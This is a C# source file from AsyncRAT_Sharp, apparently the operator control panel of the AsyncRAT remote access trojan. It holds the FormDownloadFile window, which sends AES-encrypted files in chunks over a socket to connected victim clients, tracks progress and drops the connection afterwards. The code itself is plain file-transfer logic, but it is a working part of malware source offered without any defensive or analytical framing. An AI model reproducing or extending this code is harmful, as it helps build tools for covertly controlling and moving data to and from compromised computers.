﻿using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using Timer = System.Threading.Timer;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormDownloadFile : Form
    {
        public FormDownloadFile()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }
        public long dSize = 0;
        public bool isDownload = false;
        private long BytesSent = 0;
        private Timer Tick = null;
        private async void timer1_Tick(object sender, EventArgs e)
        {
            labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(C.BytesRecevied)}";
            if (C.BytesRecevied >= dSize)
            {
                labelsize.Text = "Downloaded";
                labelsize.ForeColor = Color.Green;
                timer1.Stop();
                await Task.Delay(1500);
                this.Close();
            }
        }

        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (isDownload)
            {
                if (C != null) C.Disconnected();
            }
        }

        public void Send(object obj)
        {
            lock (C.SendSync)
            {
                try
                {
                    byte[] msg = Settings.AES.Encrypt((byte[])obj);
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    C.ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    Tick = new Timer(new TimerCallback(Timer3), null, 0, 1000);
                    C.ClientSocket.Send(buffersize);
                    int chunkSize = 50 * 1024;
                    byte[] chunk = new byte[chunkSize];
                    int SendPackage;
                    using (MemoryStream buffereReader = new MemoryStream(msg))
                    {
                        BinaryReader binaryReader = new BinaryReader(buffereReader);
                        int bytesToRead = (int)buffereReader.Length;
                        do
                        {
                            chunk = binaryReader.ReadBytes(chunkSize);
                            bytesToRead -= chunkSize;
                            SendPackage = C.ClientSocket.Send(chunk);
                            BytesSent += chunk.Length;
                        } while (bytesToRead > 0);

                        binaryReader.Close();
                    }
                }
                catch
                {
                    return;
                }
            }
        }

        private void Timer3(object obj)
        {
            if (Program.form1.InvokeRequired)
            {
                Program.form1.BeginInvoke((MethodInvoker)(async () =>
                {
                labelsize.Text = $"{Methods.BytesToString(dSize)} \\ {Methods.BytesToString(BytesSent)}";
                    if (BytesSent > dSize)
                    {
                        labelsize.Text = "Downloaded";
                        labelsize.ForeColor = Color.Green;
                        timer1.Stop();
                        await Task.Delay(1500);
                        this.Close();
                    }
                }));
            }
        }
    }
}
